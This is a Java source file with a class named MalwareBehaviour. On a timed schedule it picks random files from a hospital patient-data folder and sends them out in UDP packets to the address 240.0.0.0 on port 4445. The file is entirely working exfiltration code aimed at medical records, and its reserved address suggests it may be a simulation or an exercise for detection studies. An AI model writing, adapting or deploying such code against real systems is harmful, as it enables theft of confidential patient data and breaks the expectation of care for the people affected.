
import java.io.File;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.file.Files;
import java.time.LocalTime;
import java.util.Arrays;
import java.util.Random;

public class MalwareBehaviour extends Thread {
	private final static String BASE_PATH = "/hospital_files/patients_data/";

	public void run() {
		System.out.println("malware thread running");
		
		while (true) {
			try {

				if (LocalTime.now().getHour() == 2 & LocalTime.now().getMinute() > 11
						& LocalTime.now().getMinute() < 14) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 1 & LocalTime.now().getMinute() > 54
						& LocalTime.now().getMinute() < 57) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 0 & LocalTime.now().getMinute() > 40
						& LocalTime.now().getMinute() < 43) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 13 & LocalTime.now().getMinute() > 2
						& LocalTime.now().getMinute() < 5) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 14 & LocalTime.now().getMinute() > 29
						& LocalTime.now().getMinute() < 32) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 20 & LocalTime.now().getMinute() > 01
						& LocalTime.now().getMinute() < 04) {
					sendFile();
				}
				if (LocalTime.now().getHour() == 20 & LocalTime.now().getMinute() > 42
						& LocalTime.now().getMinute() < 45) {
					sendFile();
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private void sendFile() throws IOException {
		File folder = new File(BASE_PATH);
		File[] files = folder.listFiles();
		Random rand = new Random();
		File randomFile = files[rand.nextInt(files.length)];
		byte bytes[] = Files.readAllBytes(randomFile.toPath());

		DatagramSocket socket = new DatagramSocket();
		InetAddress address = InetAddress.getByName("240.0.0.0");
		for (int i = 0; i < bytes.length / 1024; i++) {

			DatagramPacket packet = new DatagramPacket(Arrays.copyOfRange(bytes, i * 1024, (i + 1) * 1024), 1024,
					address, 4445);
			socket.send(packet);
		}

		socket.close();
	}

}
